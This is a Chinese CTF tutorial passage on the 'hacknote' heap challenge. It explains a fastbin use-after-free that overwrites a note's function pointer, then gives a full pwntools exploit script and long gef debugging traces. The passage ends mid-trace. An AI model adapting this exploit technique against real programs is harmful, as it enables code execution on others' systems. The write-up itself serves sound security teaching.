+----------------+\n\n\n\n\n\n\n\n\n\n\u90a3\u4e48\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5728\u5806\u7684\u5b9e\u73b0\u4e2d\u6240\u5b66\u5230\u7684\uff0c\u663e\u7136note\u662f\u4e00\u4e2afastbin chunk\uff08\u5927\u5c0f\u4e3a16\u5b57\u8282\uff09\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5e0c\u671b\u4e00\u4e2anote\u7684put\u5b57\u6bb5\u4e3amagic\u7684\u51fd\u6570\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u987b\u60f3\u529e\u6cd5\u8ba9\u67d0\u4e2anote\u7684put\u6307\u9488\u88ab\u8986\u76d6\u4e3amagic\u5730\u5740\u3002\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u53ea\u6709\u552f\u4e00\u7684\u5730\u65b9\u5bf9put\u8fdb\u884c\u8d4b\u503c\u3002\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5229\u7528\u5199real content\u7684\u65f6\u5019\u6765\u8fdb\u884c\u8986\u76d6\u3002\u5177\u4f53\u91c7\u7528\u7684\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u7533\u8bf7note0\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09\n\n\n\u7533\u8bf7note1\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09\n\n\n\u91ca\u653enote0\n\n\n\u91ca\u653enote1\n\n\n\u6b64\u65f6\uff0c\u5927\u5c0f\u4e3a16\u7684fast bin chunk\u4e2d\u94fe\u8868\u4e3anote1-\nnote0\n\n\n\u7533\u8bf7note2\uff0c\u5e76\u4e14\u8bbe\u7f6ereal content\u7684\u5927\u5c0f\u4e3a8\uff0c\u90a3\u4e48\u6839\u636e\u5806\u7684\u5206\u914d\u89c4\u5219\n\n\nnote2\u5176\u5b9e\u4f1a\u5206\u914dnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u3002\n\n\nreal content \u5bf9\u5e94\u7684chunk\u5176\u5b9e\u662fnote0\u3002\n\n\n\u5982\u679c\u6211\u4eec\u8fd9\u65f6\u5019\u5411note3\u7684chunk\u90e8\u5206\u5199\u5165magic\u7684\u5730\u5740\uff0c\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u6ca1\u6709note1\u4e3aNULL\u3002\u5f53\u6211\u4eec\u518d\u6b21\u5c1d\u8bd5\u8f93\u51fanote1\u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8c03\u7528magic\u51fd\u6570\u3002\n\n\n\n\n\u5229\u7528\u811a\u672c\n\n\n#!/usr/bin/env python\n\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nprocess\n(\n./hacknote\n)\n\n\n\n\ndef\n \naddnote\n(\nsize\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n1\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \ndelnote\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n2\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \nprintnote\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n3\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\n#gdb.attach(r)\n\n\nmagic\n \n=\n \n0x08048986\n\n\n\naddnote\n(\n32\n,\n \naaaa\n)\n \n# add note 0\n\n\naddnote\n(\n32\n,\n \nddaa\n)\n \n# add note 1\n\n\n\ndelnote\n(\n0\n)\n \n# delete note 0\n\n\ndelnote\n(\n1\n)\n \n# delete note 1\n\n\n\naddnote\n(\n8\n,\n \np32\n(\nmagic\n))\n \n# add note 2\n\n\n\nprintnote\n(\n0\n)\n \n# print note 0\n\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u5177\u4f53\u770b\u4e00\u4e0b\u6267\u884c\u7684\u6d41\u7a0b\uff0c\u9996\u5148\u5148\u4e0b\u65ad\u70b9\n\n\n\u4e24\u5904malloc\u4e0b\u65ad\u70b9\n\n\ngef\u27a4  b *0x0804875C\nBreakpoint \n1\n at 0x804875c\ngef\u27a4  b *0x080486CA\nBreakpoint \n2\n at 0x80486ca\n\n\n\n\n\u4e24\u5904free\u4e0b\u65ad\u70b9\n\n\ngef\u27a4  b *0x08048893\nBreakpoint \n3\n at 0x8048893\ngef\u27a4  b *0x080488A9\nBreakpoint \n4\n at 0x80488a9\n\n\n\n\n\u7136\u540e\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7533\u8bf7note0\u65f6\uff0c\u6240\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5757\u5730\u5740\u4e3a0x0804b008\u3002\uff08eax\u5b58\u50a8\u51fd\u6570\u8fd4\u56de\u503c\uff09\n\n\n$eax\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x00000000\n\n\n$ebx\n   \n:\n \n0x00000000\n\n\n$ecx\n   \n:\n \n0xf7fac780\n  \n\u2192\n  \n0x00000000\n\n\n$edx\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x00000000\n\n\n$esp\n   \n:\n \n0xffffcf10\n  \n\u2192\n  \n0x00000008\n\n\n$ebp\n   \n:\n \n0xffffcf48\n  \n\u2192\n  \n0xffffcf68\n  \n\u2192\n  \n0x00000000\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$eip\n   \n:\n \n0x080486cf\n  \n\u2192\n  \nadd_note\n+\n89\n \nadd\n \nesp\n,\n \n0x10\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nzero\n \nSIGN\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nresume\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n    \n0\nx80486c2\n \nadd_note\n+\n76\n    \nadd\n    \nDWORD\n \nPTR\n \n[\neax\n],\n \neax\n\n    \n0\nx80486c4\n \nadd_note\n+\n78\n    \nadd\n    \nBYTE\n \nPTR\n \n[\nebx\n+\n0x86a0cec\n],\n \nal\n\n    \n0\nx80486ca\n \nadd_note\n+\n84\n    \ncall\n   \n0x80484e0\n \nmalloc@plt\n\n \n\u2192\n  \n0\nx80486cf\n \nadd_note\n+\n89\n    \nadd\n    \nesp\n,\n \n0x10\n\n    \n0\nx80486d2\n \nadd_note\n+\n92\n    \nmov\n    \nedx\n,\n \neax\n\n    \n0\nx80486d4\n \nadd_note\n+\n94\n    \nmov\n    \neax\n,\n \nDWORD\n \nPTR\n \n[\nebp-0x1c\n]\n\n    \n0\nx80486d7\n \nadd_note\n+\n97\n    \nmov\n    \nDWORD\n \nPTR\n \n[\neax\n*\n4\n+\n0x804a070\n],\n \nedx\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcf10\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcf10\n\u2502+\n0x00\n:\n \n0x00000008\n     \n\u2190\n \n$esp\n\n\n0\nxffffcf14\n\u2502+\n0x04\n:\n \n0x00000000\n\n\n0\nxffffcf18\n\u2502+\n0x08\n:\n \n0xf7e29ef5\n  \n\u2192\n  \nstrtol\n+\n5\n \nadd\n \neax\n,\n \n0x18210b\n\n\n0\nxffffcf1c\n\u2502+\n0x0c\n:\n \n0xf7e27260\n  \n\u2192\n  \natoi\n+\n16\n \nadd\n \nesp\n,\n \n0x1c\n\n\n0\nxffffcf20\n\u2502+\n0x10\n:\n \n0xffffcf58\n  \n\u2192\n  \n0xffff0a31\n  \n\u2192\n  \n0x00000000\n\n\n0\nxffffcf24\n\u2502+\n0x14\n:\n \n0x00000000\n\n\n0\nxffffcf28\n\u2502+\n0x18\n:\n \n0x0000000a\n\n\n0\nxffffcf2c\n\u2502+\n0x1c\n:\n \n0x00000000\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n---\nType\n \nreturn\n \nto\n \ncontinue\n,\n \nor\n \nq\n \nreturn\n \nto\n \nquit---\n\n\n[\n#0] 0x80486cf \u2192 Name: add_note()\n\n\n[\n#1] 0x8048ac5 \u2192 Name: main()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \nheap\n \nchunk\n \n0x0804b008\n\n\nUsedChunk\n(\naddr\n=\n0x804b008\n,\n \nsize\n=\n0x10\n)\n\n\nChunk\n \nsize\n:\n \n16\n \n(\n0x10\n)\n\n\nUsable\n \nsize\n:\n \n12\n \n(\n0xc\n)\n\n\nPrevious\n \nchunk\n \nsize\n:\n \n0\n \n(\n0x0\n)\n\n\nPREV_INUSE\n \nflag\n:\n \nOn\n\n\nIS_MMAPPED\n \nflag\n:\n \nOff\n\n\nNON_MAIN_ARENA\n \nflag\n:\n \nOff\n\n\n\n\n\n\u7533\u8bf7note 0\u7684content\u7684\u5730\u5740\u4e3a0x0804b018\n\n\n$eax\n   \n:\n \n0x0804b018\n  \n\u2192\n  \n0x00000000\n\n\n$ebx\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x0804865b\n  \n\u2192\n  \nprint_note_content\n+\n0\n \npush\n \nebp\n\n\n$ecx\n   \n:\n \n0xf7fac780\n  \n\u2192\n  \n0x00000000\n\n\n$edx\n   \n:\n \n0x0804b018\n  \n\u2192\n  \n0x00000000\n\n\n$esp\n   \n:\n \n0xffffcf10\n  \n\u2192\n  \n0x00000020\n\n\n$ebp\n   \n:\n \n0xffffcf48\n  \n\u2192\n  \n0xffffcf68\n  \n\u2192\n  \n0x00000000\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$eip\n   \n:\n \n0x08048761\n  \n\u2192\n  \nadd_note\n+\n235\n \nadd\n \nesp\n,\n \n0x10\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nZERO\n \nsign\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nresume\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n    \n0\nx8048752\n \nadd_note\n+\n220\n   \nmov\n    \nal\n,\n \nds\n:\n0x458b0804\n\n    \n0\nx8048757\n \nadd_note\n+\n225\n   \ncall\n   \n0x581173df\n\n    \n0\nx804875c\n \nadd_note\n+\n230\n   \ncall\n   \n0x80484e0\n \nmalloc@plt\n\n \n\u2192\n  \n0\nx8048761\n \nadd_note\n+\n235\n   \nadd\n    \nesp\n,\n \n0x10\n\n    \n0\nx8048764\n \nadd_note\n+\n238\n   \nmov\n    \nDWORD\n \nPTR\n \n[\nebx\n+\n0x4\n],\n \neax\n\n    \n0\nx8048767\n \nadd_note\n+\n241\n   \nmov\n    \neax\n,\n \nDWORD\n \nPTR\n \n[\nebp-0x1c\n]\n\n    \n0\nx804876a\n \nadd_note\n+\n244\n   \nmov\n    \neax\n,\n \nDWORD\n \nPTR\n \n[\neax\n*\n4\n+\n0x804a070\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcf10\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcf10\n\u2502+\n0x00\n:\n \n0x00000020\n     \n\u2190\n \n$esp\n\n\n0\nxffffcf14\n\u2502+\n0x04\n:\n \n0xffffcf34\n  \n\u2192\n  \n0xf70a3233\n\n\n0\nxffffcf18\n\u2502+\n0x08\n:\n \n0x00000008\n\n\n0\nxffffcf1c\n\u2502+\n0x0c\n:\n \n0xf7e27260\n  \n\u2192\n  \natoi\n+\n16\n \nadd\n \nesp\n,\n \n0x1c\n\n\n0\nxffffcf20\n\u2502+\n0x10\n:\n \n0xffffcf58\n  \n\u2192\n  \n0xffff0a31\n  \n\u2192\n  \n0x00000000\n\n\n0\nxffffcf24\n\u2502+\n0x14\n:\n \n0x00000000\n\n\n0\nxffffcf28\n\u2502+\n0x18\n:\n \n0x0000000a\n\n\n0\nxffffcf2c\n\u2502+\n0x1c\n:\n \n0x00000000\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n---\nType\n \nreturn\n \nto\n \ncontinue\n,\n \nor\n \nq\n \nreturn\n \nto\n \nquit---\n\n\n[\n#0] 0x8048761 \u2192 Name: add_note()\n\n\n[\n#1] 0x8048ac5 \u2192 Name: main()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \nheap\n \nchunk\n \n0x0804b018\n\n\nUsedChunk\n(\naddr\n=\n0x804b018\n,\n \nsize\n=\n0x28\n)\n\n\nChunk\n \nsize\n:\n \n40\n \n(\n0x28\n)\n\n\nUsable\n \nsize\n:\n \n36\n \n(\n0x24\n)\n\n\nPrevious\n \nchunk\n \nsize\n:\n \n0\n \n(\n0x0\n)\n\n\nPREV_INUSE\n \nflag\n:\n \nOn\n\n\nIS_MMAPPED\n \nflag\n:\n \nOff\n\n\nNON_MAIN_ARENA\n \nflag\n:\n \nOff\n\n\n\n\n\n\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230note1\u7684\u5730\u5740\u4ee5\u53ca\u5176content\u7684\u5730\u5740\u5206\u522b\u4e3a0x0804b040 \u548c0x0804b050\u3002\n\n\n\u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230note0\u4e0enote1\u5bf9\u5e94\u7684content\u786e\u5b9e\u662f\u76f8\u5e94\u7684\u5185\u5b58\u5757\u3002\n\n\ngef\n\u27a4\n  \ngrep\n \naaaa\n\n\n[+]\n \nSearching\n \naaaa\n \nin\n \nmemory\n\n\n[+]\n \nIn\n \n[\nheap\n]\n(\n0x804b000\n-\n0x806c000\n),\n \npermission\n=\nrw-\n\n  \n0\nx804b018\n \n-\n \n0x804b01c\n  \n\u2192\n   \naaaa\n \n\ngef\n\u27a4\n  \ngrep\n \nddaa\n\n\n[+]\n \nSearching\n \nddaa\n \nin\n \nmemory\n\n\n[+]\n \nIn\n \n[\nheap\n]\n(\n0x804b000\n-\n0x806c000\n),\n \npermission\n=\nrw-\n\n  \n0\nx804b050\n \n-\n \n0x804b054\n  \n\u2192\n   \nddaa\n \n\n\n\n\n\u4e0b\u9762\u5c31\u662ffree\u7684\u8fc7\u7a0b\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u53d1\u73b0\u9996\u5148\uff0cnote0\u7684content\u88abfree\n\n\n \n\u2192\n  \n0\nx8048893\n \ndel_note\n+\n143\n   \ncall\n   \n0x80484c0\n \nfree@plt\n\n   \n\u21b3\n   \n0\nx80484c0\n \nfree@plt\n+\n0\n     \njmp\n    \nDWORD\n \nPTR\n \nds\n:\n0x804a018\n\n       \n0\nx80484c6\n \nfree@plt\n+\n6\n     \npush\n   \n0x18\n\n       \n0\nx80484cb\n \nfree@plt\n+\n11\n    \njmp\n    \n0x8048480\n\n       \n0\nx80484d0\n \n__stack_chk_fail@plt\n+\n0\n \njmp\n    \nDWORD\n \nPTR\n \nds\n:\n0x804a01c\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcf20\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcf20\n\u2502+\n0x00\n:\n \n0x0804b018\n  \n\u2192\n  \naaaa\n  \n\u2190\n \n$esp\n\n\n\n\n\n\u7136\u540e\u662fnote0\u672c\u8eab\n\n\n \n\u2192\n  \n0\nx80488a9\n \ndel_note\n+\n165\n   \ncall\n   \n0x80484c0\n \nfree@plt\n\n   \n\u21b3\n   \n0\nx80484c0\n \nfree@plt\n+\n0\n     \njmp\n    \nDWORD\n \nPTR\n \nds\n:\n0x804a018\n\n       \n0\nx80484c6\n \nfree@plt\n+\n6\n     \npush\n   \n0x18\n\n       \n0\nx80484cb\n \nfree@plt\n+\n11\n    \njmp\n    \n0x8048480\n\n       \n0\nx80484d0\n \n__stack_chk_fail@plt\n+\n0\n \njmp\n    \nDWORD\n \nPTR\n \nds\n:\n0x804a01c\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcf20\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcf20\n\u2502+\n0x00\n:\n \n0x0804b008\n  \n\u2192\n  \n0x0804865b\n  \n\u2192\n  \nprint_note_content\n+\n0\n \npush\n \nebp\n  \n\u2190\n \n$esp\n\n\n\n\n\n\u5f53delete\u7ed3\u675f\u540e\uff0c\u6211\u4eec\u89c2\u770b\u4e00\u4e0bbins\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5176\u88ab\u5b58\u653e\u5728\u5bf9\u5e94\u7684fast bin\u4e2d\uff0c\n\n\ngef\n\u27a4\n  \nheap\n 